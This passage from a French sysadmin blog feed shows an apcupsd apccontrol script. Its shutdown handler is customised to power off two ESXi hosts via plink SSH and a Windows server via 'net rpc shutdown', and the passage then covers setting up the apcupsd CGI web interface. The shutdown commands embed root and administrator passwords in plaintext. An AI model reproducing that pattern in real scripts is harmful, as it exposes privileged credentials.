+&lt;span class="c1"&gt;# should change apccontrol.sh.in and then rerun the configure process.&lt;/span&gt;
+&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -f &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SCRIPTDIR&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;/&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; -a -x &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SCRIPTDIR&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;/&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;
+&lt;span class="k"&gt;then&lt;/span&gt;
+&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SCRIPTDIR&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;/&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;2&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;3&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;4&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+&lt;span class="c1"&gt;# exit code 99 means he does not want us to do default action&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="nv"&gt;$?&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;99&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
+&lt;span class="nb"&gt;exit&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;
+&lt;span class="k"&gt;fi&lt;/span&gt;
+&lt;span class="k"&gt;fi&lt;/span&gt;
+
+&lt;span class="k"&gt;case&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="nv"&gt;$1&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; in
+killpower&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Apccontrol doing: &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;APCUPSD&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; --killpower on UPS &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;2&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;WALL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+sleep &lt;span class="m"&gt;30&lt;/span&gt;
+&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;APCUPSD&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; --killpower
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Apccontrol has done: &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;APCUPSD&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; --killpower on UPS &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;2&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;WALL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+commfailure&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Warning communications lost with UPS &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;2&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;WALL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+commok&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Communications restored with UPS &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;2&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;WALL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+&lt;span class="c1"&gt;#&lt;/span&gt;
+&lt;span class="c1"&gt;# powerout, onbattery, offbattery, mainsback events occur&lt;/span&gt;
+&lt;span class="c1"&gt;# in that order.&lt;/span&gt;
+&lt;span class="c1"&gt;#&lt;/span&gt;
+powerout&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+onbattery&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Power failure on UPS &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;2&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;. Running on batteries.&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;WALL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+offbattery&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Power has returned on UPS &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;2&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;...&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;WALL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+mainsback&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; -f /etc/apcupsd/powerfail &lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
+&lt;span class="nb"&gt;printf&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Continuing with shutdown.&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;WALL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+&lt;span class="k"&gt;fi&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+failing&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Battery power exhausted on UPS &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;2&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;. Doing shutdown.&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;WALL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+timeout&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Battery time limit exceeded on UPS &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;2&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;. Doing shutdown.&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;WALL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+loadlimit&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Remaining battery charge below limit on UPS &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;2&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;. Doing shutdown.&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;WALL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+runlimit&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Remaining battery runtime below limit on UPS &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;2&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;. Doing shutdown.&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;WALL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+doreboot&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;UPS &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;2&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; initiating Reboot Sequence&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;WALL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SHUTDOWN&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; -r now &lt;span class="s2"&gt;&amp;quot;apcupsd UPS &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;2&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; initiated reboot&amp;quot;&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+doshutdown&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="c1"&gt;##############################################################################################&lt;/span&gt;
+&lt;span class="c1"&gt;#-----------------------------------PERSONNALISATION------------------------------------------&lt;/span&gt;
+&lt;span class="c1"&gt;##############################################################################################&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;****** Executing ESXi(s) and Windows Servers Shutdown Command ******&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;WALL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;****** Arret de ESXi 1 ******&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;WALL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+
+/usr/bin/plink -ssh -2 -pw monsuperpassword root@192.168.1.1 &lt;span class="s2"&gt;&amp;quot;/sbin/shutdown.sh &amp;amp;&amp;amp; /sbin/poweroff&amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;***** Arret de ESXi 2 *****&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;WALL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+/usr/bin/plink -ssh -2 -pw monsuperpassword root@192.168.1.2 &lt;span class="s2"&gt;&amp;quot;/sbin/shutdown.sh &amp;amp;&amp;amp; /sbin/poweroff&amp;quot;&lt;/span&gt;
+
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;**** Arret du Serveur Windows Physique&amp;quot;&lt;/span&gt;
+net rpc shutdown -f -t &lt;span class="m"&gt;0&lt;/span&gt; -C &lt;span class="s1"&gt;&amp;#39;Panne Electrique&amp;#39;&lt;/span&gt; -U administrateur%monsuperpassword -I &lt;span class="m"&gt;192&lt;/span&gt;.168.1.3
+
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;UPS &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;2&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; initiated Shutdown Sequence&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;WALL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SHUTDOWN&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; -h now &lt;span class="s2"&gt;&amp;quot;apcupsd UPS &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;2&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; initiated shutdown&amp;quot;&lt;/span&gt;
+&lt;span class="c1"&gt;###############################################################################################&lt;/span&gt;
+
+&lt;span class="p"&gt;;;&lt;/span&gt;
+annoyme&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Power problems with UPS &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;2&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;. Please logoff.&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;WALL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+emergency&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Emergency Shutdown. Possible battery failure on UPS &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;2&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;.&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;WALL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+changeme&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Emergency! Batteries have failed on UPS &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;2&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;. Change them NOW&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;WALL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+remotedown&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Remote Shutdown. Beginning Shutdown Sequence.&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;WALL&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+startselftest&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+endselftest&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+battdetach&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+battattach&lt;span class="o"&gt;)&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+*&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Usage: &lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="p"&gt;##*/&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; command&amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; warning: this script is intended to be launched by&amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; apcupsd and should never be launched by users.&amp;quot;&lt;/span&gt;
+&lt;span class="nb"&gt;exit&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;
+&lt;span class="p"&gt;;;&lt;/span&gt;
+&lt;span class="k"&gt;esac&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;Voila. Il ne reste plus qu’a réinitialiser le service apcupsd&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/etc/init.d/apcupsd force-reload&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;Mise en place des scripts CGI&lt;/h3&gt;
+&lt;p&gt;Un certain nombre de scripts CGI existent afin de contrôler l’état de l’onduleur à distance.&lt;/p&gt;
+&lt;p&gt;Sur DEBIAN, il faut installer le paquet apcupsd-cgi et un serveur Web pour pouvoir les consulter à distance&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# On install apache et apcupsd-cgi&lt;/span&gt;
+apt-get update &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt-get install apache2
+&lt;span class="c1"&gt;#on active CGI avec apache&lt;/span&gt;
+a2enmod cgi
+&lt;span class="c1"&gt;#on installe le l&amp;#39;add-on de apcupsd&lt;/span&gt;
+apt-get install apcupsd-cgi
+&lt;span class="c1"&gt;# on vérifie que les scripts sont bien présents&lt;/span&gt;
+ls -l /usr/lib/cgi-bin/apcupsd/
+total &lt;span class="m"&gt;112&lt;/span&gt;
+-rwxr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;27040&lt;/span&gt; avril &lt;span class="m"&gt;14&lt;/span&gt;  &lt;span class="m"&gt;2015&lt;/span&gt; multimon.cgi
+-rwxr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;23104&lt;/span&gt; avril &lt;span class="m"&gt;14&lt;/span&gt;  &lt;span class="m"&gt;2015&lt;/span&gt; upsfstats.cgi
+-rwxr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;27040&lt;/span&gt; avril &lt;span class="m"&gt;14&lt;/span&gt;  &lt;span class="m"&gt;2015&lt;/span&gt; upsimage.cgi
+-rwxr-xr-x &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;31296&lt;/span&gt; avril &lt;span class="m"&gt;14&lt;/span&gt;  &lt;span class="m"&gt;2015&lt;/span&gt; upsstats.cgi
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;On peut donc maintenant accéder à l’interface Web par l’adresse:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://ip-de-la-machine-debian/cgi-bin/apcupsd/multimon.cgi&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="liste des onduleur" src="/images/cgifig1.jpg"&gt;&lt;/p&gt;
+&lt;p&gt;Et en cliquant sur le lien:&lt;/p&gt;
+&lt;p&gt;&lt;img alt="etat de l'onduleur" src="/images/cgifig2.jpg"&gt;&lt;/p&gt;</content><category term="Linux"></category><category term="[Linux"></category><category term="Vmware]"></category></entry></feed>
